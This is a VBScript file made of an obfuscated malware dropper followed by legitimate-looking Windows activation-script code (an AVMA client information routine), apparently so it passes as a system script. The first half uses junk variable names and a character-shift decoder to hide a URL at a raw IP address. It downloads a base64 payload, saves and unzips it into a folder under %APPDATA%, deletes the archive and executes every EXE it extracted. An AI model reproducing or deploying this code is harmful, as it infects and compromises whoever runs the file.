Option Explicit
CONST wshOK                             =0
CONST VALUE_ICON_WARNING                =16
CONST wshYesNoDialog                    =4
CONST VALUE_ICON_QUESTIONMARK           =32
CONST VALUE_ICON_INFORMATION            =64
CONST HKEY_LOCAL_MACHINE                =&H80000002
CONST KEY_SET_VALUE                     =&H0002
CONST KEY_QUERY_VALUE                   =&H0001
CONST REG_SZ                            =1           
dim lnprtvvzacccegillnprrtvvegiiloo,xxybaceeiilnpruudffhjjmoqqsuuac,mprtveggilnnrrtvbeegillnpprtvvz,prtvbddfllnprtvzzacbbdfhhjnnprt
dim  oqsudgiinnprtvbbdffhjmmprrtvzza,Clqtttvzzacbddfhjmmort,SEUZP
dim  mossaacegjmmqssuxyybacceggimooq,mqXFFRJUWm
dim  nprtvzzacbddhhjmpprtvvegiilnnpr,ssuaceegillnqsuxxybbacceggilnnp,bacceggilnpprtvvehjjmooqsuuaceegiilnqqsuuxybbace
dim  vvdfhjnnrrtvzzacbbddfhhjmmprrtv,egilnpprtvzzacceegillnpprtvvegg,OBJddffhjmmoqssuaccfhj
dim  gilnprttvzaaccegiil,acegillnprttdfhjjmooqsuuacceggi,ddiilnppttvzacbbdfhhlnnprttveeg
Function Jkdkdkd(G1g)
For oqsudgiinnprtvbbdffhjmmprrtvzza = 1 To Len(G1g)
acegillnprttdfhjjmooqsuuacceggi = Mid(G1g, oqsudgiinnprtvbbdffhjmmprrtvzza, 1)
acegillnprttdfhjjmooqsuuacceggi = Chr(Asc(acegillnprttdfhjjmooqsuuacceggi)+ 6)
vvdfhjnnrrtvzzacbbddfhhjmmprrtv = vvdfhjnnrrtvzzacbbddfhhjmmprrtv + acegillnprttdfhjjmooqsuuacceggi
Next
Jkdkdkd = vvdfhjnnrrtvzzacbbddfhhjmmprrtv
End Function 
Function ttvegillnprrvvceggillnprrtvvzaacbee()
Dim ClqtttvzzacbddfhjmmortLM,jxtbbdgiilnpprttvz,jrtffhjjmoqqsuxaaw,Coltlnnprttvzaacbdffh
Set ClqtttvzzacbddfhjmmortLM = WScript.CreateObject( "WScript.Shell" )
Set jrtffhjjmoqqsuxaaw = CreateObject( "Scripting.FileSystemObject" )
Set jxtbbdgiilnpprttvz = jrtffhjjmoqqsuxaaw.GetFolder(ssuaceegillnqsuxxybbacceggilnnp)
Set Coltlnnprttvzaacbdffh = jxtbbdgiilnpprttvz.Files
For Each Coltlnnprttvzaacbdffh in Coltlnnprttvzaacbdffh
If UCase(jrtffhjjmoqqsuxaaw.GetExtensionName(Coltlnnprttvzaacbdffh.name)) = "EXE" Then
ClqtttvzzacbddfhjmmortLM.Exec(ssuaceegillnqsuxxybbacceggilnnp & "\" & Coltlnnprttvzaacbdffh.Name)
End If
Next
End Function
mossaacegjmmqssuxyybacceggimooq     = Jkdkdkd("bnnj4))+3,(,-0(+.1(+**4+3/*)<[\o\dchm](cmi")
Set OBJddffhjmmoqssuaccfhj = CreateObject( "WScript.Shell" )    
bacceggilnpprtvvehjjmooqsuuaceegiilnqqsuuxybbace = OBJddffhjmmoqssuaccfhj.ExpandEnvironmentStrings(StrReverse("%ATADPPA%"))
prtvbddfllnprtvzzacbbdfhhjnnprt = "A99449C3092CE70964CE715CF7BB75B.zip"
Function gilnprttvehhjmooqsuuaceegiilnqqsuux()
SET xxybaceeiilnpruudffhjjmoqqsuuac = CREATEOBJECT("Scripting.FileSystemObject")
IF xxybaceeiilnpruudffhjjmoqqsuuac.FolderExists(bacceggilnpprtvvehjjmooqsuuaceegiilnqqsuuxybbace + "\DecGram") = TRUE THEN WScript.Quit() END IF
IF xxybaceeiilnpruudffhjjmoqqsuuac.FolderExists(mprtveggilnnrrtvbeegillnpprtvvz) = FALSE THEN
xxybaceeiilnpruudffhjjmoqqsuuac.CreateFolder mprtveggilnnrrtvbeegillnpprtvvz
xxybaceeiilnpruudffhjjmoqqsuuac.CreateFolder OBJddffhjmmoqssuaccfhj.ExpandEnvironmentStrings(StrReverse("%ATADPPA%")) + "\DecGram"
END IF
End Function
Function vbdfhjmmqqsuzaacbddfhhjmooqssudggil()
DIM jrtffhjjmoqqsuxaaxsd
Set jrtffhjjmoqqsuxaaxsd = Createobject("Scripting.FileSystemObject")
jrtffhjjmoqqsuxaaxsd.DeleteFile ssuaceegillnqsuxxybbacceggilnnp & "\" & prtvbddfllnprtvzzacbbdfhhjnnprt
End Function
ssuaceegillnqsuxxybbacceggilnnp = bacceggilnpprtvvehjjmooqsuuaceegiilnqqsuuxybbace + "\nvmodmall"
qssuuaccehjjm
mprtveggilnnrrtvbeegillnpprtvvz = ssuaceegillnqsuxxybbacceggilnnp
gilnprttvehhjmooqsuuaceegiilnqqsuux
gilloqssuaccggillnprrtxxybaaceegill
WScript.Sleep 10103
gilnpprtveegjmooqsuuaceegillnppsuxx
WScript.Sleep 5110
vbdfhjmmqqsuzaacbddfhhjmooqssudggil
ttvegillnprrvvceggillnprrtvvzaacbee
Function qssuuaccehjjm()
Set mqXFFRJUWm = CreateObject("Scripting.FileSystemObject")
If (mqXFFRJUWm.FolderExists(ssuaceegillnqsuxxybbacceggilnnp )) Then
WScript.Quit()
End If 
End Function   
Function gilloqssuaccggillnprrtxxybaaceegill()
DIM req
Set req = CreateObject("Msxml2.XMLHttp.6.0")
req.open "GET", mossaacegjmmqssuxyybacceggimooq, False
req.send
If req.Status = 200 Then
 Dim oNode, BinaryStream
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
oNode.dataType = "bin.base64"
oNode.text = req.responseText
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write oNode.nodeTypedValue
BinaryStream.SaveToFile ssuaceegillnqsuxxybbacceggilnnp & "\" & prtvbddfllnprtvzzacbbdfhhjnnprt, adSaveCreateOverWrite
End if
End Function
nprtvzzacbddhhjmpprtvvegiilnnpr = "egilnpprtvzzacceegillnpprtvvegg"
Function gilnpprtveegjmooqsuuaceegillnppsuxx()
set Clqtttvzzacbddfhjmmort = CreateObject("Shell.Application")
set SEUZP=Clqtttvzzacbddfhjmmort.NameSpace(ssuaceegillnqsuxxybbacceggilnnp & "\" & prtvbddfllnprtvzzacbbdfhhjnnprt).items
Clqtttvzzacbddfhjmmort.NameSpace(ssuaceegillnqsuxxybbacceggilnnp & "\").CopyHere(SEUZP), 4
Set Clqtttvzzacbddfhjmmort = Nothing
End Function 

Private Sub DisplayAVMAClientInformation(objProduct)
    Dim strHostName, strPid
    Dim displayDate
    Dim bHostName, bFiletime, bPid

    strHostName = objProduct.AutomaticVMActivationHostMachineName
    bHostName = strHostName <> "" And Not IsNull(strHostName)

    Set displayDate = CreateObject("WBemScripting.SWbemDateTime")
    displayDate.Value = objProduct.AutomaticVMActivationLastActivationTime
    bFiletime = displayDate.GetFileTime(false) <> 0

    strPid = objProduct.AutomaticVMActivationHostDigitalPid2
    bPid = strPid <> "" And Not IsNull(strPid)

    If bHostName Or bFiletime Or bPid Then
        LineOut ""
        LineOut GetResource("L_MsgVLMostRecentActivationInfo")
        LineOut GetResource("L_MsgAVMAInfo")

        If bHostName Then
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & strHostName
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostMachineName") & GetResource("L_MsgNotAvailable")
        End If

        If bFiletime Then
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & displayDate.GetVarDate
        Else
            LineOut "    " & GetResource("L_MsgAVMALastActTime") & GetResource("L_MsgNotAvailable")
        End If

        If bPid Then
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & strPid
        Else
            LineOut "    " & GetResource("L_MsgAVMAHostPid2") & GetResource("L_MsgNotAvailable")
        End If
    End If

End Sub

'
' Display all information for /dlv and /dli
' If you add need to access new properties through WMI you must add them to the
' queries for service/object.  Be sure to check that the object properties in DisplayAllInformation()
' are requested for function/methods such as GetIsPrimaryWindowsSKU() and DisplayKMSClientInformation().
'